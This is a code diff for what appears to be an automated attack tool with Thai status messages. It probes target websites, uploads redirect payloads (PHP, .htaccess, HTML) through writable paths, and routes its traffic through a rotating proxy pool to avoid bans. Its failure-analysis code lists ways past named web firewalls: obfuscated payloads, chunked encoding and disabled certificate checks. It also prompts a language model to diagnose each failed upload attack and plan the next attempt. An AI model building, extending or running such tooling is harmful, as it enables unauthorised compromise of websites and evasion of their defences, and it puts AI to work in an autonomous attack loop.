@@ -17,6 +17,7 @@
 
 import { invokeLLM } from "./_core/llm";
 import { saveAttackDecision, getSuccessfulMethods } from "./db";
+import { fetchWithPoolProxy } from "./proxy-pool";
 import type { AiTargetAnalysis } from "./ai-target-analysis";
 import {
   runNonWpExploits,
@@ -401,11 +402,11 @@ async function performRecon(
     const start = Date.now();
     const ctrl = new AbortController();
     setTimeout(() => ctrl.abort(), 10000);
-    const resp = await fetch(targetUrl, {
+    const { response: resp } = await fetchWithPoolProxy(targetUrl, {
       headers: { "User-Agent": randomUA() },
       signal: ctrl.signal,
       redirect: "follow",
-    });
+    }, { targetDomain: domain, timeout: 10000 });
     if (!preAnalysis) recon.responseTimeMs = Date.now() - start;
 
     const server = resp.headers.get("server") || "";
@@ -502,12 +503,12 @@ async function performRecon(
       try {
         const ctrl = new AbortController();
         setTimeout(() => ctrl.abort(), 8000);
-        const resp = await fetch(`${targetUrl}${path}`, {
+        const { response: resp } = await fetchWithPoolProxy(`${targetUrl}${path}`, {
           method: "HEAD",
           headers: { "User-Agent": randomUA() },
           signal: ctrl.signal,
           redirect: "follow",
-        });
+        }, { targetDomain: domain, timeout: 8000 });
         recon.statusCodes[path] = resp.status;
         if (resp.status < 400 && !recon.writablePaths.includes(path)) {
           recon.writablePaths.push(path);
@@ -525,11 +526,11 @@ async function performRecon(
       try {
         const ctrl = new AbortController();
         setTimeout(() => ctrl.abort(), 8000);
-        const resp = await fetch(`${targetUrl}${path}`, {
+        const { response: resp } = await fetchWithPoolProxy(`${targetUrl}${path}`, {
           headers: { "User-Agent": randomUA() },
           signal: ctrl.signal,
           redirect: "follow",
-        });
+        }, { targetDomain: domain, timeout: 8000 });
         if (resp.status === 200 && !recon.exposedEndpoints.includes(path)) {
           recon.exposedEndpoints.push(path);
           if (path === "/xmlrpc.php") recon.hasXmlrpc = true;
@@ -546,7 +547,7 @@ async function performRecon(
     try {
       const ctrl = new AbortController();
       setTimeout(() => ctrl.abort(), 5000);
-      const resp = await fetch(targetUrl, { method: "OPTIONS", headers: { "User-Agent": randomUA() }, signal: ctrl.signal });
+      const { response: resp } = await fetchWithPoolProxy(targetUrl, { method: "OPTIONS", headers: { "User-Agent": randomUA() }, signal: ctrl.signal }, { targetDomain: domain, timeout: 5000 });
       const allow = resp.headers.get("allow") || "";
       if (allow.includes("PUT") || allow.includes("MKCOL") || allow.includes("PROPFIND")) {
         recon.hasWebdav = true;
@@ -1175,18 +1176,21 @@ async function executeDecision(
       }
     }
 
-    const resp = await fetch(uploadUrl, {
+    const targetDomain = uploadUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+    const { response: resp, method: fetchMethod } = await fetchWithPoolProxy(uploadUrl, {
       method: decision.httpMethod,
       headers,
       body: body || undefined,
       signal: controller.signal,
       redirect: "follow",
-    });
+    }, { targetDomain, timeout });
     clearTimeout(timer);
 
     result.statusCode = resp.status;
     result.responseBody = await resp.text().catch(() => "");
     resp.headers.forEach((v, k) => { result.responseHeaders[k] = v; });
+    // Log proxy method used for debugging
+    (result as any).fetchMethod = fetchMethod;
 
     // Verify file upload
     if (resp.status < 400) {
@@ -1233,11 +1237,12 @@ async function verifyFile(url: string, expectedContent: string, timeout: number)
   try {
     const ctrl = new AbortController();
     setTimeout(() => ctrl.abort(), Math.min(timeout, 10000));
-    const resp = await fetch(url, {
+    const targetDomain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+    const { response: resp } = await fetchWithPoolProxy(url, {
       headers: { "User-Agent": randomUA() },
       signal: ctrl.signal,
       redirect: "manual",
-    });
+    }, { targetDomain, timeout: Math.min(timeout, 10000) });
 
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       return { exists: true, redirectWorks: true };
@@ -1279,70 +1284,211 @@ async function aiLearn(
 ): Promise<string> {
   onEvent?.({
     type: "learn", iteration, maxIterations,
-    detail: `📚 AI กำลังวิเคราะห์ผลลัพธ์และเรียนรู้จากความล้มเหลว...`,
+    detail: `📚 AI กำลังวิเคราะห์ผลลัพธ์อย่างลึก (LLM-powered failure analysis)...`,
   });
 
-  const lessons: string[] = [];
+  // ─── STEP 1: Rule-based quick lessons (fast, always available) ───
+  const quickLessons: string[] = [];
 
-  if (executionResult.statusCode === 403) {
-    lessons.push("Server returned 403 Forbidden — WAF or permission block");
-    if (recon.waf) lessons.push(`WAF (${recon.waf}) is actively blocking`);
-    lessons.push("Next: Try HTML-only payload (WAFs rarely block HTML), or different Content-Type");
-  } else if (executionResult.statusCode === 404) {
-    lessons.push("Path not found — try different path");
-  } else if (executionResult.statusCode === 405) {
-    lessons.push("Method not allowed — try different HTTP method");
-    if (executionResult.decision.httpMethod === "PUT") lessons.push("PUT blocked → try POST multipart");
-    if (executionResult.decision.httpMethod === "POST") lessons.push("POST blocked → try PUT direct");
-  } else if (executionResult.statusCode === 413) {
-    lessons.push("Payload too large — try smaller payload or chunked upload");
-  } else if (executionResult.statusCode === 415) {
-    lessons.push("Unsupported media type — try different Content-Type");
-  } else if (executionResult.statusCode >= 500) {
-    lessons.push("Server error — might indicate partial success or misconfiguration");
-  } else if (executionResult.error?.includes("Timeout")) {
-    lessons.push("Request timed out — server may be slow or blocking");
-  } else if (executionResult.statusCode === 200 && !executionResult.fileVerified) {
-    lessons.push("Upload returned 200 but file not found — server accepted but didn't save, or saved to different location");
-    lessons.push("Next: Try PUT (creates file at exact URL), or try HTML-only payload");
-  } else if (executionResult.statusCode === 301 || executionResult.statusCode === 302) {
-    lessons.push("Server redirected the upload request — may need to follow redirect or use different path");
+  // HTTP status analysis
+  const sc = executionResult.statusCode;
+  if (sc === 0) {
+    quickLessons.push("HTTP 0 — connection-level failure (DNS, TLS, firewall, or proxy issue)");
+    if (executionResult.durationMs < 100) quickLessons.push("Very fast failure (<100ms) — likely blocked at network/firewall level, not application");
+    if (executionResult.error?.includes("fetch failed")) quickLessons.push("fetch failed = connection refused or DNS resolution failure");
+    if (executionResult.error?.includes("ECONNREFUSED")) quickLessons.push("ECONNREFUSED = server actively refusing connections on this port");
+    if (executionResult.error?.includes("ENOTFOUND")) quickLessons.push("ENOTFOUND = DNS resolution failed — domain may not exist");
+    if (executionResult.error?.includes("ETIMEDOUT")) quickLessons.push("ETIMEDOUT = connection timed out — server unreachable or firewall dropping packets");
+    if (executionResult.error?.includes("CERT") || executionResult.error?.includes("SSL") || executionResult.error?.includes("TLS")) quickLessons.push("SSL/TLS error — try HTTP instead of HTTPS, or ignore cert validation");
+  } else if (sc === 403) {
+    quickLessons.push("403 Forbidden — WAF or permission block");
+    if (recon.waf) quickLessons.push(`WAF (${recon.waf}) actively blocking`);
+    // Analyze response body for WAF signatures
+    const body = executionResult.responseBody.toLowerCase();
+    if (body.includes("cloudflare")) quickLessons.push("Cloudflare WAF detected in response — need CF bypass");
+    if (body.includes("sucuri")) quickLessons.push("Sucuri WAF detected — try obfuscated payload");
+    if (body.includes("wordfence")) quickLessons.push("Wordfence detected — try non-PHP payload");
+    if (body.includes("modsecurity") || body.includes("mod_security")) quickLessons.push("ModSecurity detected — try chunked encoding or unicode normalization");
+    if (body.includes("imunify")) quickLessons.push("Imunify360 detected — try HTML-only payload");
+    if (body.includes("astra")) quickLessons.push("Astra WAF detected — try different Content-Type");
+  } else if (sc === 404) {
+    quickLessons.push("404 Not Found — path doesn't exist");
+    if (executionResult.decision.uploadPath.includes("wp-")) quickLessons.push("WordPress path not found — target may not be WordPress");
+  } else if (sc === 405) {
+    quickLessons.push(`405 Method Not Allowed — ${executionResult.decision.httpMethod} not supported`);
+    quickLessons.push(executionResult.decision.httpMethod === "PUT" ? "PUT blocked → try POST multipart" : "POST blocked → try PUT direct");
+  } else if (sc === 413) {
+    quickLessons.push("413 Payload Too Large — reduce payload size or use chunked upload");
+  } else if (sc === 415) {
+    quickLessons.push("415 Unsupported Media Type — change Content-Type header");
+  } else if (sc === 429) {
+    quickLessons.push("429 Too Many Requests — rate limited, wait and use different proxy/IP");
+  } else if (sc >= 500 && sc < 600) {
+    quickLessons.push(`${sc} Server Error — might indicate partial success, misconfiguration, or crash`);
+    if (sc === 500 && executionResult.responseBody.includes("parse error")) quickLessons.push("PHP parse error — payload syntax issue");
+  } else if (sc === 200 && !executionResult.fileVerified) {
+    quickLessons.push("200 OK but file not found at expected URL — server accepted request but didn't save file");
+    // Check if response indicates success or just a page
+    const body = executionResult.responseBody;
+    if (body.includes("error") || body.includes("Error")) quickLessons.push("Response contains 'error' — server returned error page with 200 status");
+    if (body.includes("login") || body.includes("Login")) quickLessons.push("Response contains login page — authentication required");
+    if (body.length < 50) quickLessons.push("Very short response body — likely empty/rejected upload");
+    if (body.length > 10000) quickLessons.push("Large response body — likely returned a full page instead of upload response");
+  } else if (sc === 301 || sc === 302) {
+    const loc = executionResult.responseHeaders["location"] || "";
+    quickLessons.push(`${sc} Redirect to: ${loc || "unknown"} — upload endpoint redirects, may need auth or different path`);
+    if (loc.includes("login")) quickLessons.push("Redirected to login — authentication required for this endpoint");
   }
 
-  // Platform-specific lessons
+  // Timeout analysis
+  if (executionResult.error?.includes("Timeout") || executionResult.error?.includes("AbortError")) {
+    quickLessons.push(`Request timed out after ${executionResult.durationMs}ms — server slow or blocking`);
+    if (executionResult.durationMs > 10000) quickLessons.push("Long timeout — server may be processing but too slow");
+  }
+
+  // Platform mismatch detection
   if (recon.language === "ASP.NET" && executionResult.decision.payloadType === "php_redirect") {
-    lessons.push("CRITICAL: Target is ASP.NET but used PHP payload — switch to .aspx or HTML payload");
+    quickLessons.push("CRITICAL MISMATCH: Target is ASP.NET but used PHP payload — switch to .aspx or HTML");
   }
   if (recon.language === "JSP" && executionResult.decision.payloadType === "php_redirect") {
-    lessons.push("CRITICAL: Target is JSP but used PHP payload — switch to .jsp or HTML payload");
+    quickLessons.push("CRITICAL MISMATCH: Target is JSP but used PHP payload — switch to .jsp or HTML");
   }
   if (recon.serverType === "Nginx" && executionResult.decision.payloadType === "htaccess_rewrite") {
-    lessons.push("CRITICAL: .htaccess doesn't work on Nginx — use HTML redirect or nginx.conf injection");
+    quickLessons.push("CRITICAL MISMATCH: .htaccess doesn't work on Nginx — use HTML redirect");
+  }
+  if (recon.serverType === "IIS" && executionResult.decision.payloadType === "htaccess_rewrite") {
+    quickLessons.push("CRITICAL MISMATCH: .htaccess doesn't work on IIS — use web.config redirect");
   }
 
-  // Count failures
+  // ─── STEP 2: Failure pattern analysis across all attempts ───
   const failsByMethod = new Map<string, number>();
   const failsByPath = new Map<string, number>();
+  const failsByPayloadType = new Map<string, number>();
+  const failsByStatusCode = new Map<number, number>();
   for (const r of allResults) {
     if (!r.success) {
       failsByMethod.set(r.decision.method, (failsByMethod.get(r.decision.method) || 0) + 1);
       failsByPath.set(r.decision.uploadPath, (failsByPath.get(r.decision.uploadPath) || 0) + 1);
+      failsByPayloadType.set(r.decision.payloadType, (failsByPayloadType.get(r.decision.payloadType) || 0) + 1);
+      failsByStatusCode.set(r.statusCode, (failsByStatusCode.get(r.statusCode) || 0) + 1);
     }
   }
 
   Array.from(failsByMethod.entries()).forEach(([method, count]) => {
-    if (count >= 3) lessons.push(`Method "${method}" failed ${count}x — avoid it`);
+    if (count >= 2) quickLessons.push(`Method "${method}" failed ${count}x — AVOID`);
   });
   Array.from(failsByPath.entries()).forEach(([path, count]) => {
-    if (count >= 3) lessons.push(`Path "${path}" failed ${count}x — try different path`);
+    if (count >= 2) quickLessons.push(`Path "${path}" failed ${count}x — AVOID`);
+  });
+  Array.from(failsByPayloadType.entries()).forEach(([pt, count]) => {
+    if (count >= 2) quickLessons.push(`Payload type "${pt}" failed ${count}x — try different type`);
   });
 
-  const summary = lessons.join(". ");
+  // Detect if ALL attempts get same status code (systematic block)
+  if (failsByStatusCode.size === 1 && allResults.length >= 3) {
+    const code = Array.from(failsByStatusCode.keys())[0];
+    quickLessons.push(`ALL ${allResults.length} attempts returned HTTP ${code} — systematic block, need fundamentally different approach`);
+    if (code === 0) quickLessons.push("ALL connection-level failures — proxy/network issue or IP ban. Try different proxy pool or direct connection");
+    if (code === 403) quickLessons.push("ALL 403 — strong WAF blocking everything. Try: 1) HTML-only payload 2) Different User-Agent 3) Chunked encoding 4) Time-delayed retry");
+  }
+
+  // ─── STEP 3: LLM Deep Analysis (for complex failures) ───
+  let llmAnalysis = "";
+  const shouldUseLlm = (
+    // Use LLM when rule-based analysis isn't enough
+    iteration >= 2 || // After 2+ failures, need deeper analysis
+    sc === 0 || // Connection failures need investigation
+    (sc === 200 && !executionResult.fileVerified) || // Mysterious "success" without file
+    (sc >= 500) || // Server errors might reveal info
+    (executionResult.responseBody.length > 100 && sc >= 400) // Error pages with content to analyze
+  );
+
+  if (shouldUseLlm) {
+    try {
+      const llmResponse = await invokeLLM({
+        messages: [
+          {
+            role: "system",
+            content: `You are an expert penetration tester analyzing why a file upload attack failed. Provide ACTIONABLE diagnosis.
+
+Your analysis MUST include:
+1. ROOT CAUSE: What exactly blocked the upload (WAF rule, permission, path issue, auth required, etc.)
+2. EVIDENCE: What in the response/headers proves this diagnosis
+3. NEXT STRATEGY: Specific alternative approach that addresses the root cause
+4. CONFIDENCE: How confident you are in this diagnosis (high/medium/low)
+
+Be concise. Focus on actionable intelligence. ตอบเป็นภาษาอังกฤษ.`,
+          },
+          {
+            role: "user",
+            content: `FAILED UPLOAD ATTEMPT #${iteration}:
+
+Target: ${recon.domain} (${recon.serverType || "unknown"} / ${recon.language || "unknown"} / ${recon.cms || "no CMS"})
+WAF: ${recon.waf || "none"} (${recon.wafStrength || "unknown"})
+
+Attempt Details:
+- Method: ${executionResult.decision.method}
+- HTTP Method: ${executionResult.decision.httpMethod}
+- Path: ${executionResult.decision.uploadPath}${executionResult.decision.filename}
+- Content-Type: ${executionResult.decision.contentType}
+- Bypass Technique: ${executionResult.decision.bypassTechnique}
+- Payload Type: ${executionResult.decision.payloadType}
+
+Result:
+- Status Code: ${sc}
+- Error: ${executionResult.error || "none"}
+- Duration: ${executionResult.durationMs}ms
+- Response Headers: ${JSON.stringify(Object.fromEntries(Object.entries(executionResult.responseHeaders).slice(0, 10)))}
+- Response Body (first 500 chars): ${executionResult.responseBody.slice(0, 500)}
+- File Verified: ${executionResult.fileVerified}
+
+Previous Attempts Summary:
+${allResults.slice(0, -1).map((r, i) => `  #${i + 1}: ${r.decision.method} → HTTP ${r.statusCode} (${r.decision.bypassTechnique})`).join("\n")}
+
+Quick Analysis: ${quickLessons.join("; ")}
+
+Provide your deep analysis:`,
+          },
+        ],
+      });
+
+      const rawContent = llmResponse.choices?.[0]?.message?.content;
+      llmAnalysis = typeof rawContent === "string" ? rawContent : "";
+      if (llmAnalysis) {
+        onEvent?.({
+          type: "learn", iteration, maxIterations,
+          detail: `🧠 AI Deep Analysis: ${llmAnalysis.slice(0, 200)}...`,
+          data: { llmAnalysis },
+        });
+      }
+    } catch (e: any) {
+      // LLM analysis is optional — don't block on failure
+      onEvent?.({
+        type: "learn", iteration, maxIterations,
+        detail: `⚠️ LLM analysis unavailable: ${e.message} — using rule-based analysis`,
+      });
+    }
+  }
+
+  // ─── STEP 4: Combine all insights ───
+  const allLessons = [...quickLessons];
+  if (llmAnalysis) {
+    allLessons.push(`[AI DEEP ANALYSIS] ${llmAnalysis.slice(0, 500)}`);
+  }
+
+  const summary = allLessons.join(". ");
 
   onEvent?.({
     type: "learn", iteration, maxIterations,
-    detail: `📚 AI เรียนรู้: ${summary}`,
-    data: { lessons, failsByMethod: Object.fromEntries(failsByMethod), failsByPath: Object.fromEntries(failsByPath) },
+    detail: `📚 AI เรียนรู้ (${quickLessons.length} rules + ${llmAnalysis ? "LLM analysis" : "no LLM"}): ${quickLessons.slice(0, 3).join("; ")}`,
+    data: {
+      lessons: quickLessons,
+      llmAnalysis: llmAnalysis || null,
+      failsByMethod: Object.fromEntries(failsByMethod),
+      failsByPath: Object.fromEntries(failsByPath),
+      failsByPayloadType: Object.fromEntries(failsByPayloadType),
+      failsByStatusCode: Object.fromEntries(failsByStatusCode),
+    },
   });
 
   return summary;
